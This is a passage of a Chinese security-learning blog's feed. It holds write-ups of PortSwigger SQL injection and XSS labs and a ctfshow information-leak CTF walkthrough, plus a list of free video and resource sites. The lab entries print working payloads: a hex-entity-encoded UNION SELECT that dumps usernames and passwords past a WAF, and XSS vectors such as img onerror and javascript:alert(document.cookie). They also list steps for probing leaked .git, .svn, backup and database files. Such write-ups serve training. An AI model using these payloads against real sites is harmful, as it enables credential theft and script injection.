src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091503002.png" alt="i"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091459990.png"></p><p>接下来直接尝试注入</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091504799.png"></p><p>发现有waf</p><p>在提示里有绕waf的提示</p><p><strong>绕过 WAF</strong></p><ol><li>在注入 XML 时，请尝试使用 <a href="https://portswigger.net/web-security/xxe/xml-entities">XML 实体</a>对有效负载进行模糊处理。一种方法是使用 <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a> 扩展。只需突出显示您的输入，右键单击，然后选择 <strong>Hackvertor &gt;扩展&gt;编码 &gt; dec_entities&#x2F;hex_entities</strong>。</li><li>重新发送请求，并注意您现在收到来自应用程序的正常响应。这表明您已成功绕过 WAF。</li></ol><p>例1 进行base64编码：<br><code>&lt;@base64_0&gt;xz&lt;@/base64_0&gt;</code></p><p>例2 进行多级编码(multiple levels of encoding)：<br><code>&lt;@base64_1&gt;&lt;@hex_0(&quot; &quot;)&gt;xz&lt;@/hex_0&gt;&lt;@/base64_1&gt;</code></p><p>先安装Hackvertor</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091517908.png"></p><p>使用payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1">&lt;@hex_entities&gt;1 UNION SELECT username || &#x27;~&#x27; || password FROM users&lt;@/hex_entities&gt;<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091518418.png"></p><p>得到密码登录即可</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>burpsuite靶场</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>资源分享</title>
    <link href="/2022/11/15/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    <url>/2022/11/15/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="免费视频网站"><a href="#免费视频网站" class="headerlink" title="免费视频网站"></a>免费视频网站</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">电影先生 dianyi<span class="hljs-selector-class">.ng</span><br>COKEMV cokemv<span class="hljs-selector-class">.me</span><br>厂长资源 czspp<span class="hljs-selector-class">.com</span><br>茶杯孤 cupfox<span class="hljs-selector-class">.com</span><br><span class="hljs-number">27</span>网 <span class="hljs-number">2</span>fzb<span class="hljs-selector-class">.biz</span><br>片库网 pianko<span class="hljs-selector-class">.cn</span><br>多多影视 dukou1<span class="hljs-selector-class">.com</span><br>音范丝 yinfans.me<br></code></pre></td></tr></table></figure><h3 id="图片壁纸"><a href="#图片壁纸" class="headerlink" title="图片壁纸"></a>图片壁纸</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">动漫壁纸：https:<span class="hljs-regexp">//</span>konachan.net/<br>wallhaven：https:<span class="hljs-regexp">//</span>wallhaven.cc/<br><span class="hljs-number">3</span>G壁纸：https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">3</span>gbizhi.com/<br>极简壁纸：https:<span class="hljs-regexp">//</span>bz.zzzmh.cn/index<span class="hljs-comment">#anime</span><br></code></pre></td></tr></table></figure><h3 id="办公助手"><a href="#办公助手" class="headerlink" title="办公助手"></a>办公助手</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">PDF派：https:<span class="hljs-regexp">//</span>www.pdfpai.com/<br>图片压缩：https:<span class="hljs-regexp">//</span>www.tutieshi.com/<br>即时工具：https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">67</span>tool.com/<br>PPT宝藏：http:<span class="hljs-regexp">//</span>www.pptbz.com/<br>PPT市场：https:<span class="hljs-regexp">//</span>www.pptsupermarket.com/<br></code></pre></td></tr></table></figure><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">音乐网站：http:<span class="hljs-regexp">//</span>tools.liumingye.cn<span class="hljs-regexp">/music/</span>?page=searchPage<br>音乐下载器：https:<span class="hljs-regexp">//</span>huan-xi.github.io/<br>无名音乐：https:<span class="hljs-regexp">//</span>thewind.xyz/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>资源分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow信息泄露系列</title>
    <link href="/2022/11/10/ctfshow%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%B3%BB%E5%88%97/"/>
    <url>/2022/11/10/ctfshow%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h3 id="1-源码泄露"><a href="#1-源码泄露" class="headerlink" title="1.源码泄露"></a>1.源码泄露</h3><p>直接查看源代码即可得到flag</p><h3 id="2-前台绕过"><a href="#2-前台绕过" class="headerlink" title="2.前台绕过"></a>2.前台绕过</h3><p>限制无法查看源代码</p><p>直接在网址前加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">view-source:<br></code></pre></td></tr></table></figure><p>即可查看源代码，获取flag</p><h3 id="3-协议头信息泄露"><a href="#3-协议头信息泄露" class="headerlink" title="3.协议头信息泄露"></a>3.协议头信息泄露</h3><p>使用burp抓包</p><p>返回包发现flag</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102054255.png"></p><h3 id="4-robots后台泄露"><a href="#4-robots后台泄露" class="headerlink" title="4.robots后台泄露"></a>4.robots后台泄露</h3><p>访问robots.txt</p><p>得到信息</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102055949.png"></p><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/flagishere.txt<br></code></pre></td></tr></table></figure><p>获取flag</p><h3 id="5-phps源码泄露"><a href="#5-phps源码泄露" class="headerlink" title="5.phps源码泄露"></a>5.phps源码泄露</h3><p>访问</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">index</span>.phps<br></code></pre></td></tr></table></figure><p>为index的备份文件，获取flag</p><h3 id="6-源码压缩包泄露"><a href="#6-源码压缩包泄露" class="headerlink" title="6.源码压缩包泄露"></a>6.源码压缩包泄露</h3><p>通过扫描</p><p>网站备份文件为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">www.<span class="hljs-built_in">zip</span><br></code></pre></td></tr></table></figure><p>访问进行下载，获取源码以及flag</p><h3 id="7-版本控制泄露源码-1"><a href="#7-版本控制泄露源码-1" class="headerlink" title="7.版本控制泄露源码-1"></a>7.版本控制泄露源码-1</h3><p>本题为&#x2F;.git&#x2F;泄露</p><p>Git是一个可以实现有效控制应用版本的系统,但是在一旦在代码发布的时候,存在不规范的操作及配置就很可能将源代码泄露出去。</p><p>使用目录扫描可以扫描出&#x2F;.git&#x2F;目录，扫描工具推荐dirsearch（kali自带）</p><p>访问&#x2F;.git&#x2F;获取flag</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102055455.png"></p><h3 id="8-版本控制泄露源码-2"><a href="#8-版本控制泄露源码-2" class="headerlink" title="8.版本控制泄露源码-2"></a>8.版本控制泄露源码-2</h3><p>本题为&#x2F;.svn&#x2F;泄露</p><p>访问&#x2F;.svn&#x2F;获取flag</p><h3 id="9-vim临时文件泄露"><a href="#9-vim临时文件泄露" class="headerlink" title="9.vim临时文件泄露"></a>9.vim临时文件泄露</h3><p>说明：</p><p>vim临时文件 vim中的swp即swap文件,在编辑文件时产生,它是隐藏文件,如果原文件名是submit,则它的临时文件 submit.swp</p><p>访问index.php.swp 获取flag</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102055100.png"></p><h3 id="10-cookie泄露"><a href="#10-cookie泄露" class="headerlink" title="10.cookie泄露"></a>10.cookie泄露</h3><p>如题flag存在cookie中</p><p>使用浏览器插件，查看即可</p><p>我这里是谷歌浏览器，插件名为cookie-editor</p><p>也可以进行抓包，方法不唯一</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102055158.png"></p><h3 id="11-域名txt记录泄露"><a href="#11-域名txt记录泄露" class="headerlink" title="11.域名txt记录泄露"></a>11.域名txt记录泄露</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056667.png"></p><p>没给环境给了域名对域名进行解析</p><p>在线解析网站 <a href="http://dbcha.com/?t=1668067783">http://dbcha.com/?t=1668067783</a></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056864.png"></p><h3 id="12-敏感信息公布"><a href="#12-敏感信息公布" class="headerlink" title="12.敏感信息公布"></a>12.敏感信息公布</h3><p>进入网站下拉</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056574.png"></p><p>访问&#x2F;admin&#x2F;使用该号码进行admin账号登录</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056694.png"></p><h3 id="13-内部技术文档泄露"><a href="#13-内部技术文档泄露" class="headerlink" title="13.内部技术文档泄露"></a>13.内部技术文档泄露</h3><p>看介绍应该是网站默认密码没改</p><p>下拉找到</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056114.png"></p><p>点击访问</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102056971.png"></p><p>登录后台获取flag</p><h3 id="14-编辑器配置不当"><a href="#14-编辑器配置不当" class="headerlink" title="14.编辑器配置不当"></a>14.编辑器配置不当</h3><p>使用御剑扫描</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102057595.png"></p><p>扫描出editor直接访问</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102057632.png"></p><p>点击editor编辑器的文件上传功能</p><p>点击文件空间</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/editor/</span>attached<span class="hljs-regexp">/file/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/nothinghere/</span>fl000g.txt 发现flag文件<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102057450.png"></p><h3 id="15-密码逻辑脆弱"><a href="#15-密码逻辑脆弱" class="headerlink" title="15.密码逻辑脆弱"></a>15.密码逻辑脆弱</h3><p>看样子应该是弱口令</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102057715.png"></p><p>发现一个邮箱</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102057389.png"></p><p>扫描出一个登录页面</p><p>发现有修改密码功能</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102058733.png"></p><p>根据<a href="mailto:&#49;&#49;&#x35;&#x36;&#x36;&#51;&#49;&#57;&#x36;&#x31;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#49;&#49;&#x35;&#x36;&#x36;&#51;&#49;&#57;&#x36;&#x31;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>找到答案为 西安</p><p>重置密码进行登录即可</p><h3 id="16-探针泄露"><a href="#16-探针泄露" class="headerlink" title="16.探针泄露"></a>16.探针泄露</h3><p>有的网站搭建时可能在<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020">根目录</a>下留下探针</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102058329.png"></p><p>得知页面为php 访问PHP探针url&#x2F;tz.php</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102058223.png"></p><p>点击phpinfo，即可找到flag</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102058092.png"></p><h3 id="17-CDN穿透"><a href="#17-CDN穿透" class="headerlink" title="17.CDN穿透"></a>17.CDN穿透</h3><p>根据hint提示，直接ping <a href="http://www.ctfshow.com得到IP地址111.231.70.44">www.ctfshow.com得到IP地址111.231.70.44</a></p><h3 id="18-js敏感信息泄露"><a href="#18-js敏感信息泄露" class="headerlink" title="18.js敏感信息泄露"></a>18.js敏感信息泄露</h3><p>查看源码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102058583.png"></p><p>点击进入js文件</p><p>发现当分数大于100时</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102059248.png"></p><p>进行解码之后</p><p>在线解码<a href="https://tool.chinaz.com/tools/urlencode.aspx">https://tool.chinaz.com/tools/urlencode.aspx</a></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102059305.png"></p><p>访问110.php得到flag</p><h3 id="19-前端密钥泄露"><a href="#19-前端密钥泄露" class="headerlink" title="19.前端密钥泄露"></a>19.前端密钥泄露</h3><p>右键查看源码发现</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102059332.png"></p><p>但是输入登录一直提示密码错误</p><p>抓个包看看怎么回事</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102059750.png"></p><p>奇奇怪怪抓包就行</p><h3 id="20-数据库恶意下载"><a href="#20-数据库恶意下载" class="headerlink" title="20.数据库恶意下载"></a>20.数据库恶意下载</h3><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加&#x2F;db&#x2F;db.mdb下载文件，用记事本打开搜索flag即可。</p><hr><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102059011.png"></p><p>到此结束</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite靶场xss</title>
    <link href="/2022/11/10/burpsuite%E9%9D%B6%E5%9C%BAxss/"/>
    <url>/2022/11/10/burpsuite%E9%9D%B6%E5%9C%BAxss/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358391.png"></p><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p><code>encodeURIComponent</code> </p><p>转义除了如下所示外的所有字符：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">不转义的字符：<br>    <span class="hljs-keyword">A</span>-Z a-z <span class="hljs-number">0</span>-<span class="hljs-number">9</span> - _ . ! ~ * &#x27; ( )<br></code></pre></td></tr></table></figure><h2 id="学徒级别"><a href="#学徒级别" class="headerlink" title="学徒级别"></a>学徒级别</h2><h3 id="1-将-XSS-反射到-HTML-上下文中"><a href="#1-将-XSS-反射到-HTML-上下文中" class="headerlink" title="1.将 XSS 反射到 HTML 上下文中"></a>1.<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">将 XSS 反射到 HTML 上下文中</a></h3><p>漏洞点：搜索栏</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="2-将-XSS-反射到-HTML-上下文中"><a href="#2-将-XSS-反射到-HTML-上下文中" class="headerlink" title="2.将 XSS 反射到 HTML 上下文中"></a>2.将 XSS 反射到 HTML 上下文中</h3><p>漏洞点：文章评论区</p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="3-使用源的接收器中的-DOM-XSS"><a href="#3-使用源的接收器中的-DOM-XSS" class="headerlink" title="3.使用源的接收器中的 DOM XSS"></a>3.<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">使用源的接收器中的 DOM XSS</a></h3><p>漏洞点：搜索栏</p><p>f12打开源代码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358465.png"></p><p>使用搜所功能之后发发现dom 接口</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358451.png"></p><p>点击发现代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">document.write(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/resources/images/tracker.gif?searchTerms=&#x27;+query+&#x27;&quot;</span>&gt;</span>&#x27;)<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-使用源在接收器中输入-DOM-XSS"><a href="#4-使用源在接收器中输入-DOM-XSS" class="headerlink" title="4.使用源在接收器中输入 DOM XSS"></a>4.使用源在接收器中输入 DOM XSS</h3><p>描述：搜索博客功能中包含一个<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">基于 DOM 的跨站点脚本</a>执行漏洞。它使用赋值，该赋值使用 来自 的数据更改元素的 HTML 内容。</p><p>dom使用了赋值形</p><p>查看源代码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358423.png"></p><p>思路：属性的值</p><p>无效并引发错误。这将触发事件处理程序，然后事件处理程序调用该函数。因此，每当用户的浏览器尝试加载包含恶意帖子的页面时，都会执行有效负载。</p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src的值不正确触发事件 onerror</p><p>同理 事件型payload还有</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-使用源的-jQuery-锚点属性接收器中的-DOM-XSS"><a href="#5-使用源的-jQuery-锚点属性接收器中的-DOM-XSS" class="headerlink" title="5.使用源的 jQuery 锚点属性接收器中的 DOM XSS"></a>5.使用源的 jQuery 锚点属性接收器中的 DOM XSS</h3><p>描述：在提交反馈页中包含一个<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">基于 DOM 的跨站点脚本</a>漏洞。它使用 jQuery 库的选择器函数来查找锚点元素，并使用 来自 的数据更改其属性。<code>$``href``location.search</code></p><p>要解决此练习，请发出“后退”链接警报。<code>document.cookie</code></p><p>思路：</p><p>根据描述先找到相关代码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358421.png"></p><p>前端对应代码为</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358449.png"></p><p>因此猜测为</p><p>输入的payload当做herf的值 尝试构造payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">123</span>&quot; onclick=&quot;alert(document<span class="hljs-selector-class">.cookie</span>)&quot;<br></code></pre></td></tr></table></figure><p>发现无法闭合href属性</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358929.png"></p><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)<br></code></pre></td></tr></table></figure><p>输入之后进入href的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">href=<span class="hljs-string">&quot;javascript:alert(document.cookie)&quot;</span><br></code></pre></td></tr></table></figure><p>单击即可触发</p><hr><h3 id="6-使用哈希更改事件在-jQuery-选择器接收器中-SINK-中的-DOM-XSS"><a href="#6-使用哈希更改事件在-jQuery-选择器接收器中-SINK-中的-DOM-XSS" class="headerlink" title="6.使用哈希更改事件在 jQuery 选择器接收器中 SINK 中的 DOM XSS"></a>6.使用哈希更改事件在 jQuery 选择器接收器中 SINK 中的 DOM XSS</h3><p>描述：此实验室主页上包含一个<a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">基于 DOM 的跨站点脚本</a>漏洞。它使用jQuery的选择器函数自动滚动到给定的帖子，其标题通过属性传递。<code>$()``location.hash</code></p><p>要解决实验室问题，请向受害者提供在其浏览器中调用该函数的攻击。<code>print()</code></p><hr><h3 id="7-将-XSS-反射到带有尖括号-HTML-编码的属性中"><a href="#7-将-XSS-反射到带有尖括号-HTML-编码的属性中" class="headerlink" title="7.将 XSS 反射到带有尖括号 HTML 编码的属性中"></a>7.将 XSS 反射到带有尖括号 HTML 编码的属性中</h3><p>描述：此实验室在搜索博客功能中包含一个<a href="https://portswigger.net/web-security/cross-site-scripting/reflected">反映的跨站点脚本</a>漏洞，其中尖括号是 HTML 编码的。若要解决此实验室问题，请执行跨站点脚本攻击，该攻击会注入属性并调用函数。<code>alert</code></p><p>漏洞点在搜索框中</p><p>输入xss进行搜索</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358030.png"></p><p>发现输入的值作为了value属性的值，构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358029.png"></p><p>集合描述，是尖括号被转义，因此改用事件型触发</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;onmouseover=&quot;</span><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<br><span class="hljs-comment">//onmouseover 事件发生在鼠标指针移动到元素或它的子元素上时</span><br></code></pre></td></tr></table></figure><hr><h3 id="8-将-XSS-存储到带有双引号-HTML-编码的锚点属性中href"><a href="#8-将-XSS-存储到带有双引号-HTML-编码的锚点属性中href" class="headerlink" title="8.将 XSS 存储到带有双引号 HTML 编码的锚点属性中href"></a>8.将 XSS 存储到带有双引号 HTML 编码的锚点属性中<code>href</code></h3><p>描述：此实验室在注释功能中包含一个<a href="https://portswigger.net/web-security/cross-site-scripting/stored">存储的跨站点脚本</a>漏洞。若要解决此实验问题，请提交一个注释，该注释在单击注释作者姓名时调用该函数。<code>alert</code></p><p>思路：根据描述，漏洞点在文章评论区，而且双引号会被过滤 </p><p>解决：</p><p>一开始我以为是对Name的值进行xss，其实是对Website，Website设计的作用添加个人博客地址，游客可以点击评论者姓名即可跳转到评论者的博客地址</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358036.png"></p><p>随即便发现了漏洞点</p><p>根据描述双引号会被转义 没有双引号闭合不了herf事件 尖括号无论是否被转义都无法使用</p><p>采用js伪协议</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><hr><h3 id="9-将-XSS-反射到带有尖括号-HTML-编码的-JavaScript-字符串中"><a href="#9-将-XSS-反射到带有尖括号-HTML-编码的-JavaScript-字符串中" class="headerlink" title="9.将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中"></a>9.将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中</h3><p>根据描述是在搜索框有xss，找到了对应代码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358984.png"></p><p>发现搜索框输入的东西会被encodeURIComponent函数编码</p><p>可以通过单引号闭合</p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;_alert(1)_&#x27;</span><br></code></pre></td></tr></table></figure><hr><h3 id="10-DOM-XSS-在选择元素中使用源代码"><a href="#10-DOM-XSS-在选择元素中使用源代码" class="headerlink" title="10.DOM XSS 在选择元素中使用源代码"></a>10.DOM XSS 在选择元素中使用源代码</h3><p>随便访问一篇博客。url参数带有productId文章id</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358987.png"></p><p>此时文章末尾的选择项目有三个选项</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358397.png"></p><p>观察源代码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358487.png"></p><p>发现他是从url中获取storeId参数，前面在url中并没有</p><p>尝试在url里添加</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358509.png"></p><p>此时下拉的选项里有我们刚刚添加的storeId参数</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358511.png"></p><p>说明dom从url中提取参数</p><p>源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;&#x27;)<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358485.png"></p><p>实验完成</p><hr><h3 id="11-AngularJS表达式中的DOM-XSS，带有尖括号和双引号HTML编码"><a href="#11-AngularJS表达式中的DOM-XSS，带有尖括号和双引号HTML编码" class="headerlink" title="11.AngularJS表达式中的DOM XSS，带有尖括号和双引号HTML编码"></a>11.AngularJS表达式中的DOM XSS，带有尖括号和双引号HTML编码</h3><p>在搜索框输入任意字符搜索</p><p>查看原代码</p><p><img 